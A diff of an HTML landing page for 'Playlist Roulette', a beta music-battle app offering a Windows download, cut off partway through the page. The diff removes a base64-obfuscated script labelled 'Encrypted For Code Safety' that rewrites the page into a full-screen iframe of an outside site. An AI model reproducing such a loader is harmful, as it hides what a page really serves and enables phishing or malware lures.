@@ -1,12 +1,1018 @@
+<!DOCTYPE html>
 <html lang="en" class="dark">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Playlist Roulette — Music battles with your friends</title>
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Cdefs%3E%3CradialGradient id='a' cx='50%25' cy='40%25' r='55%25'%3E%3Cstop offset='0%25' stop-color='%239333ea'/%3E%3Cstop offset='60%25' stop-color='%237c3aed'/%3E%3Cstop offset='100%25' stop-color='%234c1d95'/%3E%3C/radialGradient%3E%3CradialGradient id='b' cx='50%25' cy='50%25' r='50%25'%3E%3Cstop offset='70%25' stop-color='transparent'/%3E%3Cstop offset='100%25' stop-color='%23d946ef' stop-opacity='.8'/%3E%3C/radialGradient%3E%3CradialGradient id='c' cx='40%25' cy='30%25' r='70%25'%3E%3Cstop offset='0%25' stop-color='%23fff'/%3E%3Cstop offset='100%25' stop-color='%23e9d5ff'/%3E%3C/radialGradient%3E%3C/defs%3E%3Ccircle cx='50' cy='50' r='48' fill='none' stroke='%23d946ef' stroke-width='1.5' stroke-opacity='.7'/%3E%3Ccircle cx='50' cy='50' r='45' fill='url(%23a)'/%3E%3Ccircle cx='50' cy='50' r='40' fill='none' stroke='rgba(255,255,255,.08)' stroke-width='1'/%3E%3Ccircle cx='50' cy='50' r='33' fill='none' stroke='rgba(255,255,255,.07)' stroke-width='1'/%3E%3Ccircle cx='50' cy='50' r='26' fill='none' stroke='rgba(255,255,255,.06)' stroke-width='1'/%3E%3Ccircle cx='50' cy='50' r='19' fill='none' stroke='rgba(255,255,255,.05)' stroke-width='1'/%3E%3Ccircle cx='50' cy='50' r='45' fill='url(%23b)'/%3E%3Cellipse cx='44' cy='62' rx='10' ry='8' fill='url(%23c)'/%3E%3Cellipse cx='44' cy='62' rx='4' ry='3.5' fill='%234c1d95'/%3E%3Crect x='53' y='30' width='5' height='33' rx='2.5' fill='url(%23c)'/%3E%3Cpath d='M58 30 Q75 36 70 50 Q65 42 58 42 Z' fill='url(%23c)'/%3E%3C/svg%3E" />
   <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Poppins:wght@700;800;900&display=swap" rel="stylesheet" />
-  <head>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = {
+      darkMode: 'class',
+      theme: { extend: { fontFamily: { sans: ['Inter','system-ui','sans-serif'], display: ['Poppins','Inter','sans-serif'] } } }
+    }
+  </script>
+  <style>
+    *{box-sizing:border-box}
+    html,body{min-height:100%;background:#07040d;color:#f4f0fb;font-family:'Inter',system-ui,sans-serif;-webkit-font-smoothing:antialiased;scroll-behavior:smooth}
+    .font-display{font-family:'Poppins','Inter',sans-serif;letter-spacing:-0.02em}
+    .bg-mesh{background-color:#07040d;background-image:radial-gradient(at 8% 12%,rgba(217,70,239,.35) 0,transparent 55%),radial-gradient(at 92% 18%,rgba(124,58,237,.30) 0,transparent 55%),radial-gradient(at 50% 95%,rgba(34,197,94,.18) 0,transparent 55%)}
+    .text-gradient{background:linear-gradient(120deg,#f5d0fe 0%,#d946ef 45%,#7c3aed 100%);-webkit-background-clip:text;background-clip:text;color:transparent}
+    .glow-shadow{box-shadow:0 0 0 1px rgba(217,70,239,.20),0 30px 80px -20px rgba(217,70,239,.45)}
+    .glow-sm{box-shadow:0 0 0 1px rgba(217,70,239,.15),0 8px 32px -8px rgba(217,70,239,.35)}
+    .scroll-mt{scroll-margin-top:96px}
+    @keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-12px)}}
+    .animate-float-slow{animation:float 6s ease-in-out infinite}
+    .animate-float-med{animation:float 5s ease-in-out infinite;animation-delay:-1.5s}
+    .animate-float-fast{animation:float 4s ease-in-out infinite;animation-delay:-3s}
+    @keyframes fadeUp{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:translateY(0)}}
+    .fade-up{animation:fadeUp .5s ease both}
+    .hero-card{background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.06);border-radius:1.5rem;transition:border-color .2s,transform .2s}
+    .hero-card:hover{border-color:rgba(255,255,255,.12);transform:translateY(-2px)}
+    .chip{display:inline-flex;align-items:center;gap:4px;padding:3px 10px;border-radius:9999px;font-size:.75rem;font-weight:600}
+    .chip-success{background:rgba(34,197,94,.15);color:#86efac}
+    .chip-primary{background:rgba(99,102,241,.15);color:#a5b4fc}
+    .chip-secondary{background:rgba(168,85,247,.15);color:#d8b4fe}
+    .chip-warning{background:rgba(251,191,36,.12);color:#fde68a}
+    .btn{display:inline-flex;align-items:center;justify-content:center;gap:8px;font-weight:600;border-radius:.75rem;cursor:pointer;transition:all .2s;border:none;text-decoration:none;white-space:nowrap}
+    .btn-lg{padding:0 2rem;height:3.5rem;font-size:1rem}
+    .btn-sm{padding:0 .875rem;height:2rem;font-size:.8125rem}
+    .btn-success{background:#17c964;color:#000}
+    .btn-success:hover{background:#12a854;transform:translateY(-1px);box-shadow:0 8px 24px -4px rgba(23,201,100,.4)}
+    .btn-bordered{background:transparent;border:1px solid rgba(255,255,255,.2);color:#f4f0fb}
+    .btn-bordered:hover{background:rgba(255,255,255,.05);border-color:rgba(255,255,255,.35)}
+    .btn-flat{background:rgba(255,255,255,.08);color:#f4f0fb}
+    .btn-flat:hover{background:rgba(255,255,255,.13)}
+    .btn-primary{background:#6366f1;color:#fff}
+    .btn-primary:hover{background:#4f46e5;transform:translateY(-1px);box-shadow:0 8px 24px -4px rgba(99,102,241,.4)}
+    .btn-ghost{background:transparent;color:rgba(255,255,255,.6);border:none}
+    .btn-ghost:hover{color:#fff;background:rgba(255,255,255,.06)}
+    .btn:disabled{opacity:.45;cursor:not-allowed;transform:none!important;box-shadow:none!important}
+    .navbar{position:sticky;top:0;z-index:40;background:rgba(7,4,13,.7);backdrop-filter:blur(20px);border-bottom:1px solid rgba(255,255,255,.05)}
+    .input-field{width:100%;background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.12);border-radius:.75rem;padding:.7rem 1rem;color:#f4f0fb;font-size:.875rem;outline:none;transition:border-color .2s,background .2s}
+    .input-field:focus{border-color:rgba(99,102,241,.6);background:rgba(99,102,241,.05)}
+    .input-field::placeholder{color:rgba(255,255,255,.28)}
+    .divider{height:1px;background:rgba(255,255,255,.05)}
+    .avatar{width:2.25rem;height:2.25rem;border-radius:9999px;background:linear-gradient(135deg,#d946ef,#7c3aed);display:flex;align-items:center;justify-content:center;font-size:.8rem;font-weight:700;color:#fff;flex-shrink:0}
+    /* MODALS */
+    .modal-backdrop{position:fixed;inset:0;background:rgba(0,0,0,.75);backdrop-filter:blur(14px);z-index:50;display:flex;align-items:center;justify-content:center;padding:1rem;opacity:0;pointer-events:none;transition:opacity .25s}
+    .modal-backdrop.open{opacity:1;pointer-events:all}
+    .modal-box{background:#0d0a1a;border:1px solid rgba(255,255,255,.1);border-radius:1.5rem;width:100%;overflow:hidden;transform:translateY(20px) scale(.97);transition:transform .3s cubic-bezier(.34,1.56,.64,1)}
+    .modal-backdrop.open .modal-box{transform:translateY(0) scale(1)}
+    .tab-list{display:flex;background:rgba(255,255,255,.05);border-radius:.75rem;padding:3px;gap:3px}
+    .tab-item{flex:1;text-align:center;padding:6px 0;border-radius:.6rem;font-size:.875rem;font-weight:500;cursor:pointer;color:rgba(255,255,255,.45);transition:all .2s;border:none;background:transparent}
+    .tab-item.active{background:#6366f1;color:#fff}
+    /* LOGO */
+    .logo-icon{width:2.25rem;height:2.25rem;border-radius:.75rem;background:transparent;display:flex;align-items:center;justify-content:center;flex-shrink:0;filter:drop-shadow(0 0 8px rgba(217,70,239,.6))}
+    .logo-img{width:100%;height:100%;object-fit:contain;border-radius:.75rem}
+    /* PLATFORM BADGE CARDS */
+    .platform-card{display:flex;align-items:center;gap:.75rem;padding:.75rem 1.25rem;border-radius:1rem;background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.07);transition:all .2s}
+    .platform-card:hover{background:rgba(255,255,255,.07);border-color:rgba(255,255,255,.14);transform:translateY(-2px)}
+    /* PHONE MOCKUP */
+    .phone-frame{filter:drop-shadow(0 20px 60px rgba(217,70,239,.3))}
+    /* SCREENSHOT LIGHTBOX */
+    #lightbox{position:fixed;inset:0;background:rgba(0,0,0,.9);backdrop-filter:blur(20px);z-index:60;display:flex;align-items:center;justify-content:center;padding:1.5rem;opacity:0;pointer-events:none;transition:opacity .25s}
+    #lightbox.open{opacity:1;pointer-events:all}
+    #lightbox img{max-width:100%;max-height:90vh;border-radius:1.25rem;box-shadow:0 0 0 1px rgba(217,70,239,.2),0 40px 100px -20px rgba(217,70,239,.5)}
+    /* DOWNLOAD MODAL */
+    .dl-option{display:flex;align-items:center;gap:1rem;padding:1rem 1.25rem;border-radius:1rem;border:1px solid rgba(255,255,255,.08);background:rgba(255,255,255,.03);cursor:pointer;transition:all .2s;text-decoration:none;color:#f4f0fb}
+    .dl-option:hover{border-color:rgba(217,70,239,.4);background:rgba(217,70,239,.07);transform:translateY(-1px)}
+    .dl-icon{width:2.75rem;height:2.75rem;border-radius:.75rem;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+    /* STATS BAR */
+    .stat-item{display:flex;flex-direction:column;align-items:center;gap:2px}
+  </style>
+</head>
+<body class="dark">
 
-  <!-- Encrypted For Code Safety. -->
-<script>document.write(decodeURIComponent(escape(atob('PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIiBjbGFzcz0iZGFyayI+CjxoZWFkPgogIDxtZXRhIGNoYXJzZXQ9IlVURi04IiAvPgogIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MS4wIiAvPgogIDx0aXRsZT5QbGF5bGlzdCBSb3VsZXR0ZSDigJQgTXVzaWMgYmF0dGxlcyB3aXRoIHlvdXIgZnJpZW5kczwvdGl0bGU+CgogIDwhLS0gRmF2aWNvbiAtLT4KICA8bGluayByZWw9Imljb24iIHR5cGU9ImltYWdlL3N2Zyt4bWwiIGhyZWY9ImRhdGE6aW1hZ2Uvc3ZnK3htbCwlM0NzdmcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB2aWV3Qm94PScwIDAgMTAwIDEwMCclM0UlM0NkZWZzJTNFJTNDcmFkaWFsR3JhZGllbnQgaWQ9J2EnIGN4PSc1MCUyNScgY3k9JzQwJTI1JyByPSc1NSUyNSclM0UlM0NzdG9wIG9mZnNldD0nMCUyNScgc3RvcC1jb2xvcj0nJTIzOTMzM2VhJy8lM0UlM0NzdG9wIG9mZnNldD0nNjAlMjUnIHN0b3AtY29sb3I9JyUyMzdjM2FlZCcvJTNFJTNDc3RvcCBvZmZzZXQ9JzEwMCUyNScgc3RvcC1jb2xvcj0nJTIzNGMxZDk1Jy8lM0UlM0MvcmFkaWFsR3JhZGllbnQlM0UlM0MvZGVmcyUzRSUzQ2NpcmNsZSBjeD0nNTAnIGN5PSc1MCcgcj0nNDUnIGZpbGw9J3VybCglMjNhKScvJTNFJTNDL3N2ZyUzRSIgLz4KCiAgPCEtLSBGb250cyAtLT4KICA8bGluayByZWw9InByZWNvbm5lY3QiIGhyZWY9Imh0dHBzOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20iIC8+CiAgPGxpbmsgcmVsPSJwcmVjb25uZWN0IiBocmVmPSJodHRwczovL2ZvbnRzLmdzdGF0aWMuY29tIiBjcm9zc29yaWdpbiAvPgogIDxsaW5rIGhyZWY9Imh0dHBzOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20vY3NzMj9mYW1pbHk9SW50ZXI6d2dodEA0MDA7NTAwOzYwMDs3MDAmZmFtaWx5PVBvcHBpbnM6d2dodEA3MDA7ODAwOzkwMCZkaXNwbGF5PXN3YXAiIHJlbD0ic3R5bGVzaGVldCIgLz4KCiAgPHN0eWxlPgogICAgaHRtbCwgYm9keSB7CiAgICAgIG1hcmdpbjogMDsKICAgICAgcGFkZGluZzogMDsKICAgICAgaGVpZ2h0OiAxMDAlOwogICAgICBiYWNrZ3JvdW5kOiAjMDAwOwogICAgICBvdmVyZmxvdzogaGlkZGVuOwogICAgfQoKICAgIGlmcmFtZSB7CiAgICAgIHBvc2l0aW9uOiBmaXhlZDsKICAgICAgaW5zZXQ6IDA7CiAgICAgIHdpZHRoOiAxMDAlOwogICAgICBoZWlnaHQ6IDEwMCU7CiAgICAgIGJvcmRlcjogbm9uZTsKICAgIH0KICA8L3N0eWxlPgo8L2hlYWQ+Cgo8Ym9keT4KICA8aWZyYW1lIHNyYz0iaHR0cHM6Ly9jbGV2ZXItc21ha2FnZXItNTJlOGEyLm5ldGxpZnkuYXBwLyI+PC9pZnJhbWU+CjwvYm9keT4KPC9odG1sPg=='))));</script>
+<!-- ═══════════════════════════════ NAVBAR ═══════════════════════════════ -->
+<nav class="navbar">
+  <div class="max-w-7xl mx-auto px-5 h-16 flex items-center justify-between">
+    <!-- Logo -->
+    <a href="#" class="flex items-center gap-2.5 no-underline">
+      <div class="logo-icon" style="width:2.4rem;height:2.4rem">
+        <svg width="38" height="38" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <defs>
+            <radialGradient id="vinylBg" cx="50%" cy="40%" r="55%">
+              <stop offset="0%" stop-color="#9333ea"/>
+              <stop offset="60%" stop-color="#7c3aed"/>
+              <stop offset="100%" stop-color="#4c1d95"/>
+            </radialGradient>
+            <radialGradient id="vinylGlow" cx="50%" cy="50%" r="50%">
+              <stop offset="70%" stop-color="transparent"/>
+              <stop offset="100%" stop-color="#d946ef" stop-opacity=".8"/>
+            </radialGradient>
+            <radialGradient id="noteGrad" cx="40%" cy="30%" r="70%">
+              <stop offset="0%" stop-color="#ffffff"/>
+              <stop offset="100%" stop-color="#e9d5ff"/>
+            </radialGradient>
+            <filter id="glow"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+          </defs>
+          <!-- Outer glow ring -->
+          <circle cx="50" cy="50" r="48" fill="none" stroke="#d946ef" stroke-width="1.5" stroke-opacity=".7"/>
+          <circle cx="50" cy="50" r="46" fill="none" stroke="#f0abfc" stroke-width=".5" stroke-opacity=".4"/>
+          <!-- Main disc -->
+          <circle cx="50" cy="50" r="45" fill="url(#vinylBg)"/>
+          <!-- Groove rings -->
+          <circle cx="50" cy="50" r="40" fill="none" stroke="rgba(255,255,255,.08)" stroke-width="1"/>
+          <circle cx="50" cy="50" r="35" fill="none" stroke="rgba(255,255,255,.07)" stroke-width="1"/>
+          <circle cx="50" cy="50" r="30" fill="none" stroke="rgba(255,255,255,.06)" stroke-width="1"/>
+          <circle cx="50" cy="50" r="25" fill="none" stroke="rgba(255,255,255,.05)" stroke-width="1"/>
+          <circle cx="50" cy="50" r="20" fill="none" stroke="rgba(255,255,255,.05)" stroke-width="1"/>
+          <circle cx="50" cy="50" r="15" fill="none" stroke="rgba(255,255,255,.04)" stroke-width="1"/>
+          <!-- Outer glow overlay -->
+          <circle cx="50" cy="50" r="45" fill="url(#vinylGlow)"/>
+          <!-- Music note -->
+          <g filter="url(#glow)">
+            <!-- Note head -->
+            <ellipse cx="44" cy="62" rx="10" ry="8" fill="url(#noteGrad)"/>
+            <ellipse cx="44" cy="62" rx="4" ry="3.5" fill="#4c1d95"/>
+            <!-- Note stem -->
+            <rect x="53" y="30" width="5" height="33" rx="2.5" fill="url(#noteGrad)"/>
+            <!-- Note flag -->
+            <path d="M58 30 Q75 36 70 50 Q65 42 58 42 Z" fill="url(#noteGrad)"/>
+          </g>
+        </svg>
+      </div>
+      <span class="font-display font-extrabold text-xl tracking-tight text-white">Playlist Roulette</span>
+      <span class="chip chip-success hidden sm:inline-flex">Beta</span>
+    </a>
+    <!-- Nav links -->
+    <div class="flex items-center gap-1 sm:gap-3" style="align-self:center">
+      <a href="#features" class="hidden md:flex btn btn-sm btn-ghost" style="align-items:center">Features</a>
+      <a href="#how" class="hidden md:flex btn btn-sm btn-ghost" style="align-items:center">How it works</a>
+      <a href="#reviews" class="hidden md:flex btn btn-sm btn-ghost" style="align-items:center">Reviews</a>
+      <button class="btn btn-sm btn-flat" onclick="openAuthModal()" style="align-items:center">Sign in</button>
+      <button class="btn btn-sm btn-success" onclick="openDownloadModal()" style="align-items:center;gap:6px">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+        Download
+      </button>
+    </div>
+  </div>
+</nav>
+
+<!-- ═══════════════════════════════ HERO ═══════════════════════════════ -->
+<section class="relative bg-mesh overflow-hidden">
+  <div class="max-w-7xl mx-auto px-5 pt-16 pb-24 lg:pt-24 lg:pb-32 grid lg:grid-cols-12 gap-12 items-center">
+    <div class="lg:col-span-7">
+      <span class="chip chip-success mb-6">
+        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>
+        Beta — Now looking for testers
+      </span>
+      <h1 class="font-display text-5xl sm:text-6xl lg:text-7xl font-extrabold leading-[1.05] tracking-tight">
+        <span class="text-gradient">Music battles</span><br />with your friends.
+      </h1>
+      <p class="mt-6 text-lg sm:text-xl text-white/65 max-w-xl leading-relaxed">
+        Spin up a room, drop your favorite Spotify or YouTube tracks, and let the group vote — anonymously. Whoever wins gets the bragging rights for the night.
+      </p>
+      <div class="mt-9 flex flex-col sm:flex-row gap-3">
+        <button onclick="openDownloadModal()" class="btn btn-lg btn-success">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+          Download for Free
+        </button>
+        <a href="#how" class="btn btn-lg btn-bordered">See how it works</a>
+      </div>
+      <div class="mt-6 flex flex-wrap items-center gap-3 text-sm text-white/45">
+        <button class="btn btn-sm btn-ghost underline-offset-4 hover:underline px-0" onclick="openAuthModal()">Or sign in to the web beta</button>
+        <span class="text-white/20">·</span>
+        <span>No card. No ads. Just vibes.</span>
+      </div>
+      <!-- Mini stats -->
+      <div class="mt-10 flex items-center gap-6">
+        <div class="stat-item">
+          <span class="font-display font-extrabold text-xl text-white">320</span>
+          <span class="text-xs text-white/40">Beta testers</span>
+        </div>
+        <div class="w-px h-8 bg-white/10"></div>
+        <div class="stat-item">
+          <span class="font-display font-extrabold text-xl text-white">1.5k+</span>
+          <span class="text-xs text-white/40">Songs played</span>
+        </div>
+        <div class="w-px h-8 bg-white/10"></div>
+        <div class="stat-item">
+          <span class="font-display font-extrabold text-xl text-white">4.5</span>
+          <span class="text-xs text-white/40">Avg. rating</span>
+        </div>
+      </div>
+    </div>
+    <!-- Floating screenshots -->
+    <div class="lg:col-span-5 relative h-[520px] hidden lg:block">
+      <img src="assets/screenshot-lobby.png" alt="Lobby" onclick="openLightbox(this.src)" class="absolute left-0 top-4 w-56 rounded-3xl glow-shadow animate-float-slow cursor-zoom-in hover:scale-105 transition-transform duration-300" />
+      <img src="assets/screenshot-playing.png" alt="Now playing" onclick="openLightbox(this.src)" class="absolute left-44 top-24 w-60 rounded-3xl glow-shadow animate-float-med z-10 cursor-zoom-in hover:scale-105 transition-transform duration-300" />
+      <img src="assets/screenshot-results.png" alt="Results" onclick="openLightbox(this.src)" class="absolute right-0 top-12 w-56 rounded-3xl glow-shadow animate-float-fast cursor-zoom-in hover:scale-105 transition-transform duration-300" />
+    </div>
+  </div>
+</section>
+
+<!-- PLATFORM BADGES -->
+<div class="max-w-7xl mx-auto px-5 pt-10 pb-16">
+  <p class="text-xs uppercase tracking-widest font-medium text-white/20 text-center mb-5">Works nicely with</p>
+  <div class="grid grid-cols-2 sm:grid-cols-4 gap-3">
+
+    <!-- Spotify -->
+    <div class="flex items-center gap-3 px-4 py-3 rounded-2xl" style="background:rgba(29,185,84,.08);border:1px solid rgba(29,185,84,.18)">
+      <div style="width:2.5rem;height:2.5rem;border-radius:.875rem;background:#1DB954;display:flex;align-items:center;justify-content:center;flex-shrink:0;box-shadow:0 4px 16px rgba(29,185,84,.35)">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M12 0C5.4 0 0 5.4 0 12s5.4 12 12 12 12-5.4 12-12S18.66 0 12 0zm5.521 17.34c-.24.359-.66.48-1.021.24-2.82-1.74-6.36-2.101-10.561-1.141-.418.122-.779-.179-.899-.539-.12-.421.18-.78.54-.9 4.56-1.021 8.52-.6 11.64 1.32.42.18.479.659.301 1.02zm1.44-3.3c-.301.42-.841.6-1.262.3-3.239-1.98-8.159-2.58-11.939-1.38-.479.12-1.02-.12-1.14-.6-.12-.48.12-1.021.6-1.141C9.6 9.9 15 10.561 18.72 12.84c.361.181.54.78.241 1.2zm.12-3.36C15.24 8.4 8.82 8.16 5.16 9.301c-.6.179-1.2-.181-1.38-.721-.18-.601.18-1.2.72-1.381 4.26-1.26 11.28-1.02 15.721 1.621.539.3.719 1.02.419 1.56-.299.421-1.02.599-1.559.3z"/></svg>
+      </div>
+      <div>
+        <p class="font-semibold text-sm text-white">Spotify</p>
+        <p class="text-xs text-white/40">Paste any track link</p>
+      </div>
+    </div>
+
+    <!-- YouTube -->
+    <div class="flex items-center gap-3 px-4 py-3 rounded-2xl" style="background:rgba(255,0,0,.07);border:1px solid rgba(255,0,0,.18)">
+      <div style="width:2.5rem;height:2.5rem;border-radius:.875rem;background:#FF0000;display:flex;align-items:center;justify-content:center;flex-shrink:0;box-shadow:0 4px 16px rgba(255,0,0,.3)">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M23.495 6.205a3.007 3.007 0 00-2.088-2.088c-1.87-.501-9.396-.501-9.396-.501s-7.507-.01-9.396.501A3.007 3.007 0 00.527 6.205a31.247 31.247 0 00-.522 5.805 31.247 31.247 0 00.522 5.783 3.007 3.007 0 002.088 2.088c1.868.502 9.396.502 9.396.502s7.506 0 9.396-.502a3.007 3.007 0 002.088-2.088 31.247 31.247 0 00.5-5.783 31.247 31.247 0 00-.5-5.805zM9.609 15.601V8.408l6.264 3.602z"/></svg>
+      </div>
+      <div>
+        <p class="font-semibold text-sm text-white">YouTube</p>
+        <p class="text-xs text-white/40">Any video link works</p>
+      </div>
+    </div>
+
+    <!-- Groups -->
+    <div class="flex items-center gap-3 px-4 py-3 rounded-2xl" style="background:rgba(217,70,239,.07);border:1px solid rgba(217,70,239,.18)">
+      <div style="width:2.5rem;height:2.5rem;border-radius:.875rem;background:linear-gradient(135deg,#d946ef,#7c3aed);display:flex;align-items:center;justify-content:center;flex-shrink:0;box-shadow:0 4px 16px rgba(217,70,239,.35)">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17 21v-2a4 4 0 00-4-4H5a4 4 0 00-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 00-3-3.87"/><path d="M16 3.13a4 4 0 010 7.75"/></svg>
+      </div>
+      <div>
+        <p class="font-semibold text-sm text-white">2–10 Players</p>
+        <p class="text-xs text-white/40">Real-time sync</p>
+      </div>
+    </div>
+
+    <!-- Windows -->
+    <div class="flex items-center gap-3 px-4 py-3 rounded-2xl" style="background:rgba(0,120,212,.07);border:1px solid rgba(0,120,212,.18)">
+      <div style="width:2.5rem;height:2.5rem;border-radius:.875rem;background:#0078D4;display:flex;align-items:center;justify-content:center;flex-shrink:0;box-shadow:0 4px 16px rgba(0,120,212,.35)">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="white"><path d="M0 3.449L9.75 2.1v9.451H0m10.949-9.602L24 0v11.4H10.949M0 12.6h9.75v9.451L0 20.699M10.949 12.6H24V24l-12.9-1.801"/></svg>
+      </div>
+      <div>
+        <p class="font-semibold text-sm text-white">Windows App</p>
+        <p class="text-xs text-white/40">Free download</p>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- ═══════════════════════════════ FEATURES ═══════════════════════════════ -->
+<section id="features" class="scroll-mt py-24 sm:py-32">
+  <div class="max-w-7xl mx-auto px-5">
+    <div class="max-w-2xl mb-14">
+      <span class="chip chip-primary mb-4">Why it works</span>
+      <h2 class="font-display text-4xl sm:text-5xl font-bold tracking-tight mt-3">
+        Built for groups who actually <span class="text-gradient">love music</span>.
+      </h2>
+    </div>
+    <div class="grid md:grid-cols-3 gap-5">
+      <div class="hero-card relative overflow-hidden">
+        <div class="absolute inset-0 opacity-50 bg-gradient-to-br from-fuchsia-500/25 to-transparent pointer-events-none"></div>
+        <div class="relative p-8">
+          <div class="w-14 h-14 rounded-2xl flex items-center justify-center mb-5" style="background:linear-gradient(135deg,rgba(217,70,239,.25),rgba(124,58,237,.15));border:1px solid rgba(217,70,239,.3);box-shadow:0 4px 20px rgba(217,70,239,.2)">
+            <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#e879f9" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M17 21v-2a4 4 0 00-4-4H5a4 4 0 00-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 00-3-3.87"/><path d="M16 3.13a4 4 0 010 7.75"/></svg>
+          </div>
+          <h3 class="font-display text-xl font-bold mb-2">Real-time room sync</h3>
+          <p class="text-white/55 leading-relaxed text-sm">Friends join with a 6-letter code. Songs, votes, and the player all stay in sync — no refresh needed.</p>
+        </div>
+      </div>
+      <div class="hero-card relative overflow-hidden">
+        <div class="absolute inset-0 opacity-50 bg-gradient-to-br from-violet-500/25 to-transparent pointer-events-none"></div>
+        <div class="relative p-8">
+          <div class="w-14 h-14 rounded-2xl flex items-center justify-center mb-5" style="background:linear-gradient(135deg,rgba(124,58,237,.25),rgba(99,102,241,.15));border:1px solid rgba(124,58,237,.3);box-shadow:0 4px 20px rgba(124,58,237,.2)">
+            <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#a78bfa" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M9 18V5l12-2v13"/><circle cx="6" cy="18" r="3"/><circle cx="18" cy="16" r="3"/></svg>
+          </div>
+          <h3 class="font-display text-xl font-bold mb-2">Spotify &amp; YouTube</h3>
+          <p class="text-white/55 leading-relaxed text-sm">Paste any Spotify track or YouTube link. We embed the real player so it sounds exactly like the original.</p>
+        </div>
+      </div>
+      <div class="hero-card relative overflow-hidden">
+        <div class="absolute inset-0 opacity-50 bg-gradient-to-br from-emerald-500/25 to-transparent pointer-events-none"></div>
+        <div class="relative p-8">
+          <div class="w-12 h-12 rounded-xl bg-emerald-500/15 border border-emerald-500/20 flex items-center justify-center mb-5">
+            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#34d399" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><polyline points="9 12 11 14 15 10"/></svg>
+          </div>
+          <h3 class="font-display text-xl font-bold mb-2">Anonymous voting</h3>
+          <p class="text-white/55 leading-relaxed text-sm">No one sees who picked what until the round is over. Pure taste — no friend politics.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══════════════════════════════ HOW IT WORKS ═══════════════════════════════ -->
+<section id="how" class="scroll-mt py-24 sm:py-32 relative">
+  <div class="absolute inset-0 bg-mesh opacity-35 pointer-events-none"></div>
+  <div class="max-w-7xl mx-auto px-5 relative">
+    <div class="max-w-2xl mb-14">
+      <span class="chip chip-secondary mb-4">How it works</span>
+      <h2 class="font-display text-4xl sm:text-5xl font-bold tracking-tight mt-3">
+        From silence to <span class="text-gradient">screaming the chorus</span> in 90 seconds.
+      </h2>
+    </div>
+    <div class="grid md:grid-cols-2 lg:grid-cols-4 gap-5">
+      <div class="hero-card p-6 group">
+        <div class="w-10 h-10 rounded-xl bg-fuchsia-500/10 border border-fuchsia-500/20 flex items-center justify-center mb-4 group-hover:bg-fuchsia-500/20 transition-colors">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#e879f9" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>
+        </div>
+        <p class="font-display text-3xl font-extrabold text-white/15 mb-2">01</p>
+        <h3 class="font-display text-lg font-bold mb-1.5">Create a room</h3>
+        <p class="text-white/50 text-sm leading-relaxed">One tap, no signup. You get a 6-letter code to share.</p>
+      </div>
+      <div class="hero-card p-6 group">
+        <div class="w-10 h-10 rounded-xl bg-violet-500/10 border border-violet-500/20 flex items-center justify-center mb-4 group-hover:bg-violet-500/20 transition-colors">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#a78bfa" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z"/></svg>
+        </div>
